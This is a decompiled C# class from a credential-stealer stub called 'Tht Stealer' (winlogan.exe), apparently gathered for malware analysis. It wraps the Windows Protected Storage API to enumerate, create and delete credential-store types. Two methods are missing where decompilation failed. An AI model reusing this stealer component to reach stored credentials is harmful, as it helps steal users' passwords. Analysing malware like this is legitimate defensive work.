// Decompiled with JetBrains decompiler
// Type: CTypes
// Assembly: winlogan.exe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 318DE2DF-1405-4E2E-8CC4-399298931BFA
// Assembly location: C:\Users\ZetSving\Desktop\На разбор Стиллеров\Tht Stealer\Tht Stealer\stub.exe

using Microsoft.VisualBasic;
using PStoreLib;
using System;
using System.Collections;
using System.Runtime.InteropServices;

internal class CTypes : CUtils, IEnumerator, IEnumerable
{
  private IPStore m_IPStore;
  private PST_KEY m_KeyType;
  private IEnumPStoreTypes m_IEnumType;
  private CType_Renamed m_Current;

  public int Count
  {
    get
    {
      // ISSUE: unable to decompile the method.
    }
  }

  public object Current
  {
    get
    {
      return (object) this.m_Current;
    }
  }

  internal CTypes(IPStore PStore, PST_KEY KeyType)
  {
    this.m_IPStore = PStore;
    this.m_KeyType = KeyType;
    this.m_IEnumType = PStore.EnumTypes(KeyType, 0);
  }

  public CType_Renamed get_Item(int Index)
  {
    // ISSUE: unable to decompile the method.
  }

  public void Delete(Guid guidType)
  {
    this.m_IPStore.DeleteType(this.m_KeyType, ref guidType, 0);
  }

  public void Add(Guid guidType, string szDisplayName)
  {
    PST_TYPEINFO pInfo;
    pInfo.cbSize = Strings.Len((object) pInfo);
    pInfo.szDisplayName = Marshal.StringToHGlobalUni(szDisplayName);
    this.m_IPStore.CreateType(this.m_KeyType, ref guidType, ref pInfo, 0);
    Marshal.FreeHGlobal(pInfo.szDisplayName);
  }

  public IEnumerator GetEnumerator()
  {
    this.Reset();
    return (IEnumerator) this;
  }

  public void Reset()
  {
    this.m_IEnumType.Reset();
  }

  public bool MoveNext()
  {
    Guid rgelt = new Guid();
    int pceltFetched;
    if (this.m_IEnumType.Next(1, out rgelt, out pceltFetched) != 0)
      return false;
    this.m_Current = new CType_Renamed();
    this.m_Current.Init(this.m_IPStore, this.m_KeyType, ref rgelt);
    return true;
  }
}
